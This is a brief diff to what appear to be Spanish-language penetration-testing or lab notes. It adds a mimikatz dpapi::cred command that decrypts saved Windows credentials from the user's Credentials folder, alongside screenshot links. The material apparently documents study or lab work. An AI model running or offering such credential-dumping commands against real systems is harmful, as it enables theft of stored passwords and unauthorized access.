@@ -349,3 +349,6 @@ estaremos a la escucha
 
 `vamos a ver las credenciales`
 ![[Pasted image 20240404212901.png]]
+
+`dpapi::cred /in:"%appdata%\Microsoft\Credentials\NOMBREDECREDENCIAL"`
+![[Pasted image 20240404213301.png]]
